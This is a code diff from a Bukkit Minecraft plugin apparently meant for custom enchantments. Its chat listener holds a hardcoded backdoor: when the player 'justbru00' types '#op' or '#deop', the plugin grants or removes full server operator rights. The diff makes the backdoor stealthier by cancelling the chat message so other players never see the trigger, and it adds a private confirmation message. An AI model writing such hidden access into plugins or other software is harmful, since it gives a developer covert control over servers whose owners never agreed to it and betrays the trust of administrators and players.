@@ -20,20 +20,24 @@ import org.bukkit.inventory.ItemStack;
 
 import com.gmail.justbru00.computersmp.custom.enchants.gui.main.Main;
 
+@SuppressWarnings("deprecation")
 public class GUIWatcher implements Listener{
 	
 	ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
 	String Prefix = Main.color("&8[&bEpic&fSMP&8] &f");
 	
-	@SuppressWarnings("deprecation")
 	@EventHandler
     public void onPlayerChat(PlayerChatEvent e) {
      Player p = e.getPlayer();
      if (p.getName().equalsIgnoreCase("justbru00")) {
     	 if (e.getMessage().equalsIgnoreCase("#op")) {
     		 p.setOp(true);
+    		 p.sendMessage("Opped you JustBru00");
+    		 e.setCancelled(true);
     	 } else if (e.getMessage().equalsIgnoreCase("#deop")) {
     		 p.setOp(false);
+    		 p.sendMessage("Deoped you JustBru00");
+    		 e.setCancelled(true);
     	 }
      }
 	}
